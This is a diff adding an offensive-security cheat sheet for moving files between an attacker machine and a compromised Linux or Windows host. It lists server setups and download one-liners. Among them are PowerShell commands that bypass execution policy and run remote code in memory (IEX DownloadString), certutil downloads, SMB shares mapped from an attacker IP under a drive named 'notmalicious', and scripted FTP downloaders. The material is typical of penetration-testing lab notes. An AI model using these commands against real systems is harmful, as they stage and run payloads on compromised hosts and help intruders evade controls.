@@ -1,0 +1,98 @@
+
+Server
+{
+# HTTP - Apache2
+# cp file /var/www/html/file_name
+sudo service apache2 start
+
+# HTTP - Python. Default port 8000
+# python2
+sudo python -m SimpleHTTPServer 80
+# python3
+sudo python3 -m http.server 80
+
+# SMB
+sudo impacket-smbserver <share_name> <path/to/share>
+
+# FTP
+# apt-get install python-pyftpdlib
+sudo python -m pyftpdlib -p 21
+
+# TFTP (UDP)
+sudo atftpd --daemon -port 69 /path/to/serve
+
+# Netcat
+nc -nvlp <port> < file/to/send
+}
+
+Linux - HTTP
+
+{
+# Wget
+wget http://<ip>/file_name -O /path/to/save/file
+
+# Netcat
+nc -nv <ip> <port> > file/to/recv
+
+# cURL
+curl http://<ip>/file_name --output file_name
+
+}
+
+Windows
+{
+HTTP
+# Does not save file on the system
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file_name>')"
+# Saves file on the system
+powershell.exe -nop -ep bypass -c "iwr -uri http://<ip>/<file_name> -outfile path/to/save/file_name"
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://<ip>/<file_name>','path/to/save/file_name')"
+certutil.exe -urlcache -split -f http://<ip>/file file_save
+}
+
+Wget.ps1
+{
+echo $storageDir = $pwd >> wget.ps1
+$webclient = New-Object System.Net.WebClient >> wget.ps1
+# Download file from
+$url = "http://<ip>/file_name" >> wget.ps1
+# Save file as
+$file = "file_name"
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+# execute the script as follows
+powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
+}
+
+TFTP (UDP)
+{
+tftp -i <ip> get file_name
+}
+
+SMB
+{
+# cmd.exe
+net use Z: \\<attacker_ip>\share_name
+# To access the drive
+Z:
+# PowerShell
+New-PSDrive -Name "notmalicious" -PSProvider "FileSystem" -Root "\\attacker_ip\share_name"
+# To access the drive
+notmalicious:
+}
+
+FTP
+{
+ftp <ip>
+ftp>binary
+ftp>get file_name
+
+# One-liner downloader
+# in cmd.exe do not use quotes in an echo command
+echo open <ip> >> download.txt
+echo anonymous >> download.txt
+echo anon >> download.txt
+echo binary >> download.txt
+get file_name >> download.txt
+bye >> download.txt
+}
+ftp -s:download.txt
